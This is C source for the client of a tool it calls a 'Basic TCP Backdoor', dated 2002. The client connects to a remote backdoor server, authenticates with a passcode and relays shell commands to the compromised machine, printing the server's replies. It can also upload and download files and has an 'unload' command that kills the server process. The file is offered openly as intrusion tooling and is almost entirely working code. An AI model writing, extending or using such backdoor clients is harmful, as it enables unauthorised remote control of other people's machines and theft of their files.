/*
 * Basic TCP Backdoor v0.4
 *
 * 10/10/02 by detach (XT) - www.duho.org
 */

#include "main.h"

enum sets
{
  STDIN,
  SOCK=1
};

fd_set rd_fd;
struct timeval tv;
struct timeval *tvp;
int ret;

void
usage(char *argv[])
{
  printf("use> %s <-h hostname> <-p port>\n", argv[0]);
}

int
chk_fd(sfd)
{
  FD_ZERO(&rd_fd);
  FD_SET(sfd, &rd_fd);
  FD_SET(STDIN, &rd_fd);

  memset(&tv, 0, sizeof(tv));

  tv.tv_sec = 60; /* just a guess, hell it works */
  tv.tv_usec = 0;

  ret = select(sfd+1, &rd_fd, NULL, NULL, tvp);

  if (ret)
  {
    if (FD_ISSET(STDIN, &rd_fd))
    {
      tvp=&tv;
      return STDIN;
    }

    else if (FD_ISSET(sfd, &rd_fd))
    {
      tvp=NULL;
      return SOCK;
    }

    else
      return -1;
  }
  else
    return -1;
}

int
main (int argc,
      char *argv[])
{
  int sockfd;
  int portnr;
  int retval;
  int c;
  int rc;
  long i=0;
  char stdin[1024];
  char stdout[1024];
  struct xfer_struct xfer;
  char *name=NULL;

  xfer.mode=0;
  xfer.port=0;

  printf("Basic TCP Backdoor client\n"
         "By detach [DUHO] <http://www.duho.org/>\n\n");

 if (argc>1)
  while ( (c=getopt(argc, argv, "h:p:")) !=EOF )
  {
    switch(c)
    {
      case 'h':
        name = (char*)strdup(optarg);
        break;
 
      case 'p':
        portnr = atoi(optarg);
        if (portnr<=0 || portnr>=65536)
        {
          printf("Stupid! Use a valid port number\n");
          exit(0);
        }
        break;
 
      default:
        usage(argv);
        exit(0);
    }
  }
 else
 {
   usage(argv);
   exit(0);
 }

  printf("Connecting... ");
  fflush(NULL);

  if (!(sockfd=BDconnect(name, portnr)))
  {
    printf("Connection failed, exiting.\n");
    exit(1);
  }
  else
    printf("connected.\n");

  printf("Passcode: ");
  memset(stdin, 0, sizeof(stdin));
  scanf("%s", (char*)&stdin);

  retval = send(sockfd, stdin, strlen(stdin), 0);
  if(retval<=0)
  {
    perror("send()");
    exit(1);
  }

  for (;;)
  {
    switch (chk_fd(sockfd))
    {
      case STDIN:
        memset(stdin, 0, sizeof(stdin));
        for (i=0; i<(sizeof(stdin)-1); i++)
        {
          stdin[i] = getchar();
          if (stdin[i]=='\n')
            break;
        }

        if (stdin[i]=='\n')
        {
          if (stdin[0]==';')
          {
            char cmd[255];
            int idx;
            int jdx;
            memset(cmd, 0, sizeof(cmd));
            for(idx=1, jdx=0; idx<sizeof(cmd)
                           && idx<strlen(stdin); idx++, jdx++)
              if (stdin[idx]!='\n')
                cmd[jdx]=stdin[idx];
            cmd[jdx]='\0';
            if (!strncmp(cmd, "help", 4))
            {
              printf("\n;<command> - execute commands on your local machine\n");
              printf(";xfer help - up- or download files\n");
              printf("exit - logout\n");
              printf("unload - kill server proces completely\n\n");
            }
            else if (!strncmp(cmd, "xfer", 4))
            {
              if (parse_xfer(&cmd, &xfer))
              {
                if (chk_struct(&xfer))
                {
                  if (!BDxfer(&xfer, sockfd))
                    printf("FAILED!\n");
                  else
                    printf("DONE!\n");
                }
              }
            }
            else
              system(cmd);
            continue;
          }

          tv.tv_sec=3;
          tv.tv_usec=0;
          if (select(sockfd+1, NULL, &rd_fd, NULL, &tv)>0)
          {
            retval = send(sockfd, stdin, strlen(stdin), 0);
            if(retval<=0)
            {
              perror("send()");
              exit(1);
            }

            if (!strcmp(stdin, "exit\n")
              ||!strcmp(stdin, "unload\n"))
            {
              tvp=NULL;
              while(!select(sockfd+1, &rd_fd, NULL, NULL, tvp))
                ;
              shutdown(sockfd, SHUT_RDWR);
              exit(0);
            }
          }
        }

        break;
    
      case SOCK:
        memset(stdout, 0, sizeof(stdout));
        if ((rc=recv(sockfd, &stdout, sizeof(stdout)-2, 0))==-1)
        {
          perror("recv()");
          exit(1);
        }

        stdout[rc]='\0';
        printf("%s", stdout);

        break;
    }
  }
  shutdown(sockfd, SHUT_RDWR);
}
